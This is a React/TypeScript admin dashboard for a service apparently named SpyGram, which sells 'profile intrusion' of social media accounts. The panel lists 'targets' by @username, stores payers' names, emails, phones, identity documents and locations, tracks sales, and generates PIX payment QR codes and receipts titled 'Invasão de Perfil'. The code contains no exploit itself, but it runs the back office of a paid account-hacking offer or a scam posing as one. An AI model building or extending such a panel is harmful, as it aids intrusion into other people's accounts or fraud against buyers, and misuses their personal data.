import React, { useEffect, useState, useMemo, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../integrations/supabase/client';
import { 
  Users, DollarSign, Search, ShieldCheck, 
  CreditCard, LogOut, RotateCcw,
  Trash2, MessageCircle, Key, BarChart3, 
  Map as MapIcon, QrCode, Download, X, FileText
} from 'lucide-react';
import { 
  LineChart, Line, XAxis, YAxis, CartesianGrid, 
  Tooltip, ResponsiveContainer, AreaChart, Area 
} from 'recharts';
import Loader from '../components/Loader';
import toast from 'react-hot-toast';
import jsPDF from 'jspdf';
import html2canvas from 'html2canvas';

interface Lead {
  id: string;
  username_searched: string;
  full_name: string;
  profile_pic: string;
  email: string;
  phone: string;
  document: string;
  status: string;
  total_amount: number;
  city: string;
  state: string;
  user_agent: string;
  created_at: string;
  updated_at: string;
}

const AdminPage: React.FC = () => {
  const navigate = useNavigate();
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'leads' | 'analytics' | 'sales'>('leads');
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  
  // State para modal de PIX
  const [showPixModal, setShowPixModal] = useState(false);
  const [selectedLead, setSelectedLead] = useState<Lead | null>(null);
  const [pixAmount, setPixAmount] = useState('29.90');
  const [generatedPix, setGeneratedPix] = useState<any>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const pixPdfRef = useRef<HTMLDivElement>(null);

  const fetchLeads = async (silent = false) => {
    if (!silent) setLoading(true);
    try {
      const { data, error } = await supabase
        .from('leads')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      if (data) setLeads(data);
      if (silent) toast.success('Dados atualizados!');
    } catch (error: any) {
      toast.error('Erro ao carregar dados');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLeads();
    const channel = supabase
      .channel('admin-realtime')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'leads' }, () => {
        fetchLeads(true);
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  // Métricas Computadas
  const metrics = useMemo(() => {
    const total = leads.length;
    const paid = leads.filter(l => l.status === 'pagou');
    const revenue = paid.reduce((acc, curr) => acc + (Number(curr.total_amount) || 0), 0);
    
    // Agrupamento por Estado/Cidade
    const geoMap: Record<string, { count: number, cities: Record<string, number> }> = {};
    leads.forEach(l => {
      const st = l.state || 'N/A';
      const ct = l.city || 'Desconhecida';
      if (!geoMap[st]) geoMap[st] = { count: 0, cities: {} };
      geoMap[st].count++;
      geoMap[st].cities[ct] = (geoMap[st].cities[ct] || 0) + 1;
    });

    const geoData = Object.entries(geoMap)
      .map(([uf, data]) => ({
        uf,
        count: data.count,
        percent: ((data.count / total) * 100).toFixed(1),
        mainCities: Object.entries(data.cities)
          .sort((a, b) => b[1] - a[1])
          .slice(0, 5)
          .map(([city, count]) => `${city} (${count})`)
          .join(' • ')
      }))
      .sort((a, b) => b.count - a.count);

    // Dados de Vendas para o Gráfico
    const salesByDate: Record<string, number> = {};
    const last7Days = Array.from({ length: 7 }, (_, i) => {
      const d = new Date();
      d.setDate(d.getDate() - i);
      return d.toISOString().split('T')[0];
    }).reverse();

    last7Days.forEach(date => salesByDate[date] = 0);
    paid.forEach(l => {
      const date = l.updated_at?.split('T')[0];
      if (salesByDate[date] !== undefined) {
        salesByDate[date] += Number(l.total_amount);
      }
    });

    const chartData = Object.entries(salesByDate).map(([date, amount]) => ({
      date: date.split('-').slice(1).reverse().join('/'),
      amount
    }));

    return { total, paidCount: paid.length, revenue, geoData, chartData };
  }, [leads]);

  const filteredLeads = useMemo(() => {
    const searchLower = searchTerm.toLowerCase().trim();
    return leads.filter(lead => {
      const matchesSearch = searchLower === '' || 
        (lead.username_searched || '').toLowerCase().includes(searchLower) ||
        (lead.email || '').toLowerCase().includes(searchLower) ||
        (lead.full_name || '').toLowerCase().includes(searchLower);
      return matchesSearch && (statusFilter === 'all' || lead.status === statusFilter);
    });
  }, [leads, searchTerm, statusFilter]);

  const handleGeneratePix = async () => {
    if (!selectedLead) return;
    setPixLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke('royal-banking-payment', {
        body: { 
          name: selectedLead.full_name || selectedLead.username_searched,
          email: selectedLead.email,
          document: selectedLead.document,
          phone: selectedLead.phone,
          amount: parseFloat(pixAmount),
          leadId: selectedLead.id
        },
      });

      if (error || !data.paymentCode) throw new Error('Falha ao gerar PIX');
      setGeneratedPix(data);
      toast.success('PIX Gerado com sucesso!');
    } catch (err) {
      toast.error('Erro ao processar PIX manual');
    } finally {
      setPixLoading(false);
    }
  };

  const downloadPixPdf = async () => {
    if (!pixPdfRef.current) return;
    const canvas = await html2canvas(pixPdfRef.current, { scale: 2 });
    const imgData = canvas.toDataURL('image/png');
    const pdf = new jsPDF('p', 'mm', 'a4');
    const imgProps = pdf.getImageProperties(imgData);
    const pdfWidth = pdf.internal.pageSize.getWidth();
    const pdfHeight = (imgProps.height * pdfWidth) / imgProps.width;
    pdf.addImage(imgData, 'PNG', 0, 0, pdfWidth, pdfHeight);
    pdf.save(`PIX-SpyGram-${selectedLead?.username_searched}.pdf`);
    toast.success('PDF gerado!');
  };

  if (loading) return <div className="min-h-screen bg-black flex items-center justify-center"><Loader /></div>;

  return (
    <div className="min-h-screen bg-[#080808] text-gray-200 p-4 md:p-8 font-sans">
      {/* Header */}
      <header className="mb-10 flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
        <div>
          <div className="flex items-center gap-3 mb-1">
            <h1 className="text-3xl font-black text-white uppercase tracking-tighter">Command Center</h1>
            <div className="bg-red-500/10 border border-red-500/20 px-3 py-1 rounded-full flex items-center gap-2">
              <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse" />
              <span className="text-red-500 text-[10px] font-black tracking-widest">LIVE</span>
            </div>
          </div>
          <nav className="flex gap-4 mt-4">
            <TabButton active={activeTab === 'leads'} onClick={() => setActiveTab('leads')} icon={Users} label="Leads" />
            <TabButton active={activeTab === 'analytics'} onClick={() => setActiveTab('analytics')} icon={MapIcon} label="Geolocalização" />
            <TabButton active={activeTab === 'sales'} onClick={() => setActiveTab('sales')} icon={BarChart3} label="Vendas" />
          </nav>
        </div>
        
        <div className="flex items-center gap-3">
          <button onClick={() => fetchLeads(true)} className="p-3 bg-white/5 border border-white/10 rounded-xl hover:bg-white/10 transition-all">
            <RotateCcw className="w-5 h-5" />
          </button>
          <div className="bg-purple-600 px-6 py-2.5 rounded-xl flex items-center gap-3 shadow-lg shadow-purple-600/20">
            <DollarSign className="w-5 h-5 text-white" />
            <span className="font-black text-white text-lg">R$ {metrics.revenue.toFixed(2)}</span>
          </div>
          <button onClick={() => navigate('/admin-login')} className="p-3 bg-red-600/10 border border-red-600/20 text-red-500 rounded-xl">
            <LogOut className="w-5 h-5" />
          </button>
        </div>
      </header>

      {/* Tab: Leads List */}
      {activeTab === 'leads' && (
        <div className="bg-gray-900/40 border border-gray-800 rounded-3xl p-6">
          <div className="flex flex-col md:flex-row gap-4 justify-between items-center mb-6">
            <div className="relative w-full md:max-w-md">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
              <input 
                type="text" 
                placeholder="Buscar por @username, e-mail ou nome..." 
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-black/50 border border-gray-800 rounded-2xl py-3.5 pl-12 pr-4 text-sm focus:border-purple-500 outline-none transition-all"
              />
            </div>
            <select 
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="bg-black/50 border border-gray-800 rounded-2xl py-3.5 px-6 text-xs font-black uppercase outline-none"
            >
              <option value="all">Todos Status</option>
              <option value="pesquisou">Pesquisou</option>
              <option value="checkout">No Checkout</option>
              <option value="gerou_pix">Gerou Pix</option>
              <option value="pagou">Pago</option>
            </select>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead>
                <tr className="text-[10px] text-gray-500 uppercase font-black border-b border-gray-800/50">
                  <th className="pb-4 px-4">Alvo</th>
                  <th className="pb-4 px-4">Lead Info</th>
                  <th className="pb-4 px-4">Localização</th>
                  <th className="pb-4 px-4">Status</th>
                  <th className="pb-4 px-4 text-center">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-800/30">
                {filteredLeads.map((lead) => (
                  <tr key={lead.id} className="group hover:bg-white/[0.02] transition-colors">
                    <td className="py-5 px-4">
                      <div className="flex items-center gap-3">
                        <img src={lead.profile_pic || '/perfil.jpg'} className="w-10 h-10 rounded-xl object-cover border border-white/5" />
                        <div>
                          <p className="text-sm font-bold text-white">@{lead.username_searched || '---'}</p>
                          <p className="text-[10px] text-gray-500 font-bold uppercase">{new Date(lead.created_at).toLocaleDateString()}</p>
                        </div>
                      </div>
                    </td>
                    <td className="py-5 px-4">
                      <p className="text-xs font-black text-gray-300 uppercase">{lead.full_name || 'Anônimo'}</p>
                      <p className="text-[11px] text-gray-500 lowercase">{lead.email || 'sem e-mail'}</p>
                    </td>
                    <td className="py-5 px-4">
                      <p className="text-xs font-bold text-white">{lead.city || 'N/A'}</p>
                      <p className="text-[10px] text-gray-500 uppercase font-black">{lead.state || 'N/A'}</p>
                    </td>
                    <td className="py-5 px-4">
                      <span className={`text-[9px] font-black px-2.5 py-1 rounded-lg uppercase ${
                        lead.status === 'pagou' ? 'bg-green-500/10 text-green-500 border border-green-500/20' :
                        lead.status === 'gerou_pix' ? 'bg-pink-500/10 text-pink-500 border border-pink-500/20' : 'bg-gray-800 text-gray-400'
                      }`}>
                        {lead.status}
                      </span>
                    </td>
                    <td className="py-5 px-4">
                      <div className="flex items-center justify-center gap-2">
                        <button 
                          onClick={() => { setSelectedLead(lead); setShowPixModal(true); setGeneratedPix(null); }}
                          className="p-2 bg-yellow-600/10 text-yellow-500 rounded-lg border border-yellow-600/20 hover:bg-yellow-600/20"
                          title="Gerar PIX Manual"
                        >
                          <QrCode size={16} />
                        </button>
                        <button 
                          onClick={() => window.open(`https://wa.me/55${lead.phone?.replace(/\D/g, '')}`, '_blank')}
                          className="p-2 bg-green-500/10 text-green-500 rounded-lg border border-green-500/20 hover:bg-green-500/20"
                        >
                          <MessageCircle size={16} />
                        </button>
                        <button 
                          className="p-2 bg-purple-600/10 text-purple-500 rounded-lg border border-purple-600/20 hover:bg-purple-600/20"
                        >
                          <Key size={16} />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Tab: Analytics (Geolocation) */}
      {activeTab === 'analytics' && (
        <div className="space-y-6">
          <div className="bg-gray-900/40 border border-gray-800 rounded-3xl p-8">
            <h2 className="text-xl font-black text-white uppercase tracking-tighter mb-6 flex items-center gap-3">
              <MapIcon className="text-purple-500" /> LEADS POR ESTADO E CIDADE
            </h2>
            <div className="space-y-4">
              {metrics.geoData.map((item, idx) => (
                <div key={idx} className="bg-black/40 border border-white/5 rounded-2xl p-5 group hover:border-purple-500/30 transition-all">
                  <div className="flex justify-between items-center mb-3">
                    <div className="flex items-center gap-4">
                      <span className="text-xl font-black text-white w-12">{item.uf}</span>
                      <div className="h-2 w-48 bg-gray-800 rounded-full overflow-hidden">
                        <div className="h-full bg-purple-600" style={{ width: `${item.percent}%` }}></div>
                      </div>
                      <span className="text-xs font-black text-purple-400">{item.percent}%</span>
                    </div>
                    <span className="text-lg font-black text-white">{item.count} <span className="text-[10px] text-gray-500 uppercase">Leads</span></span>
                  </div>
                  <p className="text-xs text-gray-500 font-medium">
                    <span className="text-gray-400 font-bold uppercase mr-2">Cidades:</span> 
                    {item.mainCities}
                  </p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Tab: Sales (Performance) */}
      {activeTab === 'sales' && (
        <div className="bg-gray-900/40 border border-gray-800 rounded-3xl p-8">
          <div className="flex justify-between items-center mb-8">
            <h2 className="text-xl font-black text-white uppercase tracking-tighter flex items-center gap-3">
              <BarChart3 className="text-green-500" /> Desempenho de Vendas
            </h2>
          </div>
          <div className="h-[400px] w-full">
            <ResponsiveContainer width="100%" height="100%">
              <AreaChart data={metrics.chartData}>
                <defs>
                  <linearGradient id="colorAmt" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#9333ea" stopOpacity={0.3}/>
                    <stop offset="95%" stopColor="#9333ea" stopOpacity={0}/>
                  </linearGradient>
                </defs>
                <CartesianGrid strokeDasharray="3 3" stroke="#262626" vertical={false} />
                <XAxis dataKey="date" stroke="#525252" fontSize={12} tickLine={false} axisLine={false} />
                <YAxis stroke="#525252" fontSize={12} tickLine={false} axisLine={false} tickFormatter={(val) => `R$${val}`} />
                <Tooltip 
                  contentStyle={{ backgroundColor: '#171717', border: '1px solid #262626', borderRadius: '12px' }}
                  itemStyle={{ color: '#a855f7', fontWeight: 'bold' }}
                />
                <Area type="monotone" dataKey="amount" stroke="#9333ea" strokeWidth={3} fillOpacity={1} fill="url(#colorAmt)" />
              </AreaChart>
            </ResponsiveContainer>
          </div>
        </div>
      )}

      {/* Modal: PIX Manual */}
      <AnimatePresence>
        {showPixModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm">
            <div className="bg-gray-900 border border-gray-800 w-full max-w-lg rounded-[2.5rem] overflow-hidden shadow-2xl">
              <div className="p-8">
                <div className="flex justify-between items-center mb-8">
                  <h3 className="text-xl font-black text-white uppercase tracking-tighter">Gerar PIX Manual</h3>
                  <button onClick={() => setShowPixModal(false)} className="p-2 hover:bg-white/5 rounded-full"><X /></button>
                </div>

                {!generatedPix ? (
                  <div className="space-y-6">
                    <div className="p-4 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-4">
                      <img src={selectedLead?.profile_pic || '/perfil.jpg'} className="w-12 h-12 rounded-xl object-cover" />
                      <div>
                        <p className="text-sm font-black text-white">@{selectedLead?.username_searched}</p>
                        <p className="text-xs text-gray-500">{selectedLead?.email}</p>
                      </div>
                    </div>
                    <div>
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-2 block">Valor da Recarga (R$)</label>
                      <input 
                        type="number" 
                        value={pixAmount}
                        onChange={(e) => setPixAmount(e.target.value)}
                        className="w-full bg-black/50 border border-gray-800 rounded-xl py-4 px-6 text-white text-lg font-black outline-none focus:border-yellow-500"
                      />
                    </div>
                    <button 
                      onClick={handleGeneratePix}
                      disabled={pixLoading}
                      className="w-full bg-yellow-600 hover:bg-yellow-500 text-black font-black py-4 rounded-xl flex items-center justify-center gap-3 transition-all"
                    >
                      {pixLoading ? <div className="w-5 h-5 border-2 border-black/30 border-t-black rounded-full animate-spin" /> : <><QrCode size={20} /> GERAR QR CODE</>}
                    </button>
                  </div>
                ) : (
                  <div className="space-y-6 flex flex-col items-center">
                    {/* Visualização para o PDF */}
                    <div ref={pixPdfRef} className="bg-white p-10 rounded-3xl text-black w-full text-center">
                      <div className="flex justify-center mb-6">
                         <img src="/spygram_transparentebranco.png" alt="SpyGram" className="h-12 brightness-0" />
                      </div>
                      <h4 className="text-lg font-black uppercase mb-2">Comprovante de Pagamento PIX</h4>
                      <p className="text-xs text-gray-500 mb-8 uppercase font-bold">Invasão de Perfil: @{selectedLead?.username_searched}</p>
                      
                      <div className="bg-gray-100 p-6 rounded-2xl inline-block mb-6">
                        <img src={`data:image/png;base64,${generatedPix.paymentCodeBase64}`} className="w-48 h-48" />
                      </div>
                      
                      <div className="text-left space-y-2 border-t pt-6">
                        <p className="text-[10px] font-bold text-gray-400 uppercase">Destinatário: <span className="text-black">SPYGRAM INTELLIGENCE</span></p>
                        <p className="text-[10px] font-bold text-gray-400 uppercase">Valor: <span className="text-black text-lg">R$ {parseFloat(pixAmount).toFixed(2)}</span></p>
                      </div>
                    </div>

                    <div className="flex gap-3 w-full">
                      <button 
                        onClick={() => { navigator.clipboard.writeText(generatedPix.paymentCode); toast.success('Código copiado!'); }}
                        className="flex-1 bg-white/5 border border-white/10 text-white font-black py-4 rounded-xl flex items-center justify-center gap-2 hover:bg-white/10"
                      >
                        <FileText size={18} /> COPIAR CÓDIGO
                      </button>
                      <button 
                        onClick={downloadPixPdf}
                        className="flex-1 bg-purple-600 text-white font-black py-4 rounded-xl flex items-center justify-center gap-2 hover:bg-purple-500 shadow-lg shadow-purple-600/20"
                      >
                        <Download size={18} /> BAIXAR PDF
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const TabButton = ({ active, onClick, icon: Icon, label }: any) => (
  <button 
    onClick={onClick}
    className={`flex items-center gap-2 px-4 py-2 rounded-xl transition-all font-black text-[10px] uppercase tracking-widest
      ${active ? 'bg-white/10 text-white border border-white/10' : 'text-gray-500 hover:text-gray-300'}`}
  >
    <Icon size={14} />
    {label}
  </button>
);

export default AdminPage;